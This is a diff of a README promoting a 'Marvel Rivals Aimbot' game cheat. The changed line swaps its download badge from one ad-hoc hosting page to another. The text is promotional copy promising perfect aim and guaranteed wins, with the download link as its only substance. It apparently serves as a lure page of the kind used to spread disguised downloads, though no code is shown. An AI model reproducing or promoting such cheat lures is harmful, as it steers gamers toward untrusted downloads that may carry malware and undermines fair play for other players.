@@ -4,7 +4,7 @@ Marvel Rivals 🦸‍♂️ Aimbot is the ultimate cheat for players who want to
 
 This hack integrates seamlessly into the game, providing you with enhanced aiming features without disrupting your experience. With perfect aim, you can effortlessly defeat opponents, complete missions faster, and secure your victory every time you enter the battlefield.
 
-[![Download Marvel Rivals Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload5.bitbucket.io/)
+[![Download Marvel Rivals Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Marvel-Rivals-Aimbot-lipi.github.io/.github)
 
 ## Key Features
 🎯 **Perfect Aim** – Automatically adjusts your aim for accurate, guaranteed hits.  
